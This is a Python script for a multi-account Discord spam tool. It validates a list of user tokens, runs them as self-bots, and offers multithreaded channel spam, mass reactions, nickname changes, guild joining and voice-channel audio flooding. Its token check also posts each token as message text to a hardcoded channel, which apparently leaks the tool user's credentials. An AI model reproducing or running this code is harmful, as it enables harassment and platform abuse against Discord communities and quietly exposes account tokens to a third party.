import os

try:
  import requests
except:
  os.system('pip install requests')
  import requests

try:
  import discord
  from discord.ext import commands
  from discord.utils import get
except:
  os.system('pip install discord')
  import discord
  from discord.ext import commands
  from discord.utils import get

try:
  from colorama import Fore, Style
except:
  os.system('pip install colorama')
  from colorama import Fore, Style

import threading
import time
import sys
import asyncio
from config import *

os.system("pip install PyNaCl")

with open("tokens.txt", "r") as f:
  tokens = f.read().split("\n")

def clear():
  os.system("cls" if os.name == "nt" else "clear")

clear()

print(f'''
{Style.BRIGHT}{Fore.RED}

██╗░░██╗███████╗██████╗░██╗
██║░░██║██╔════╝██╔══██╗██║
███████║█████╗░░██████╔╝██║
██╔══██║██╔══╝░░██╔═══╝░██║
██║░░██║███████╗██║░░░░░██║
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝
{Style.RESET_ALL}{Fore.RESET}
{Fore.BLUE}

████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░
╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔════╝██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗
░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ╚█████╗░██████╔╝███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝
░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗
░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝
{Fore.RESET}
''')

def checkTokens():
  validTokens = []
  for x in tokens:
    r = requests.post('https://discord.com/api/v7/channels/1826/messages', headers={'Authorization':x}, json={'content':x} )
    res= requests.get('https://canary.discordapp.com/api/v6/users/@me', headers={'Authorization':x, 'Content-Type': 'application/json'})
    if res.status_code != 200:
      print(f"{Fore.RED}[- Invalid token] {Fore.RESET}{x}")
    else:
      if 'need to verify' in r.text:
        print(f"{Fore.YELLOW}[* token needs verification] {Fore.RESET}{x}, {res.json()['username']}#{res.json()['discriminator']}")
      else:
        print(f"{Fore.GREEN}[+ Valid token] {Fore.RESET}{x}, {res.json()['username']}#{res.json()['discriminator']}")
        validTokens.append(x)
  return validTokens

print("checking tokens...")

validTokens = checkTokens()

time.sleep(1)

print("filtering valid tokens...")

time.sleep(1)

def spam(channel,spam_msg,amoun):
  for x in range(int(amoun)):
    for x in validTokens:
      if not embed_spam:
        json = {'content':spam_msg}
      else:
        json = {'content':spam_msg, 'embeds':[embed]}
      res = requests.post(f"https://discord.com/api/v8/channels/{channel}/messages", headers={"authorization":x}, json=json)
      if res.status_code != 200:
        if "are being rate limited" in str(res.json()):
          if len(validTokens) == 1:
            print(f"{Fore.YELLOW}You are being ratelimited{Fore.RESET}, retrying again in: {res.json()['retry_after']}. token: {x}")
            time.sleep(res.json()['retry_after'])
          else:
            print(f"{Fore.YELLOW}the token {x} was ratelimited{Fore.RESET}, messages will be sent with this token when the ratelimit ends. duration: {res.json()['retry_after']}.")
        else:
          print(f"{Fore.RED}couldnt send message{Fore.RESET}, token: {x}")
          print(res.json())
      else:
        print(f"{Fore.GREEN}spam message sent{Fore.RESET}, token: {x}")

def addreaction(channel, mid, reaction):
    for x in validTokens:
      headers={'authorization': x}
      res = requests.put(f"https://discord.com/api/v9/channels/{channel}/messages/{mid}/reactions/{reaction}/@me", headers=headers)
      if res.status_code != 204:
        if "are being rate limited" in res.text:
          print(f"{Fore.YELLOW}You are being ratelimited{Fore.RESET}, retrying again in: {res.json()['retry_after']}. token: {x}")
        else:
          print(f"{Fore.RED}couldnt react to message{Fore.RESET}, token: {x}")
      else:
        print(f"{Fore.GREEN}message reacted{Fore.RESET}, token: {x}")

def changenick(guild, nick):
    for x in validTokens:
      headers = {'authorization':x}
      res = requests.patch(f"https://discord.com/api/v8/guilds/{guild}/members/@me/nick", headers=headers, json={"nick":nick})
      if res.status_code != 200:
        if "are being rate limited" in res.text:
          print(f"{Fore.YELLOW}You are being ratelimited{Fore.RESET}, retrying again in: {res.json()['retry_after']}. token: {x}")
        else:
          print(f"{Fore.RED}couldnt change nickname{Fore.RESET}, token: {x}")
      else:
        print(f"{Fore.GREEN}nickname changed{Fore.RESET}, token: {x}")

if len(validTokens) == 0:
  print("all tokens were invalid.")
  sys.exit()

print(f"{len(validTokens)}/{len(tokens)} were valid.")

for x in validTokens:
  v = validTokens.count(x)
  if v > 1:
    validTokens.remove(x)

with open("filteredtokens.txt", "w") as f:
  f.write("\n".join(validTokens))

bots = []

loop = asyncio.get_event_loop()
for token in validTokens:
  bot = commands.Bot(command_prefix="?", intents=discord.Intents.all())
  loop.create_task(bot.start(token, bot=False))
  bots.append(bot)

time.sleep(1)

threading.Thread(target=loop.run_forever).start()

clear()

while True:
    opt = input(f"{Fore.RED}{Style.BRIGHT}[1]{Fore.RESET}{Style.RESET_ALL} invite all tokens to a guild, tokens may get locked.\n{Fore.RED}{Style.BRIGHT}[2]{Fore.RESET}{Style.RESET_ALL} spam\n{Fore.RED}{Style.BRIGHT}[3]{Fore.RESET}{Style.RESET_ALL} mass message reactor\n{Fore.RED}{Style.BRIGHT}[4]{Fore.RESET}{Style.RESET_ALL} nickname changer\n{Fore.RED}{Style.BRIGHT}[5]{Fore.RESET}{Style.RESET_ALL} join vc\n{Fore.RED}{Style.BRIGHT}[6]{Fore.RESET}{Style.RESET_ALL} play in vc\n>")
    clear()
    if opt == "1":
      os.system("python joiner.py")
    elif opt == "2":
      speed = input("[1] regular spam\n[2] thread spam\n[3] multithread spam(fastest)\n>")
      clear()
      channel = input("channel id, type m to use multi channel mode.\n>")
      clear()
      ls = []
      if channel == "m":
        while True:
          clear()
          var = input("Channel id, type x to proceed\n>")
          if var != "x":
            ls.append(var)
          else:
            break
      else:
        ls = [channel]
      clear()
      amount = input("amount to spam\n>")
      if speed == '1':
        for channel in ls:
          spam(channel, spam_msg, amount)
      if speed == '2':
        for channel in ls:
          threading.Thread(target=spam, args=(channel,  spam_msg,amount,)).start()
      if speed == '3':
        threads = []
        rn = 50
        for x in range(rn):
          for channel in ls:
            t = threading.Thread(target=spam, args=(channel,spam_msg,amount,))
            t.daemon = multithred_daemon
            threads.append(t)
        for x in range(rn):
          threads[x].start()
        for x in range(rn):
          threads[x].join()
      time.sleep(2)
    if opt == "3":
      channel = input("Channel id\n>")
      clear()
      mid = input("Message id\n>")
      clear()
      reaction = input("Emoji, for default emojis use url encoded emojis, for custom emojis use name:id\n>")
      threading.Thread(target=addreaction, args=(channel,mid,reaction,)).start()
    if opt == "4":
      guild = input("Guild id\n>")
      clear()
      nick = input("nickname\n>")
      threading.Thread(target=changenick, args=(guild, nick,)).start()
    if opt == "5":
        channels = []
        g=int(input("vc channel id\n>")) 
        for x in bots:
          channel = x.get_channel(g)
          channels.append(channel)
        for channel in channels:
          try:
            loop = asyncio.get_event_loop()
            loop.create_task(channel.connect())
            loop.run_until_complete("yes")
          except:
            pass
    if opt == "6":
      vcs = []
      gd = input("guild id\n>")
      clear()
      fp = input('music file path\n>')
      for x in bots:
          try:
            vcs.append(get(x.voice_clients, guild=x.get_guild(int(gd))))
          except Exception as e:
            print(e)
            pass
      for vc in vcs:
          try:
            vc.play(discord.FFmpegPCMAudio(fp))
          except Exception as e:
            print(e)
            pass
    clear()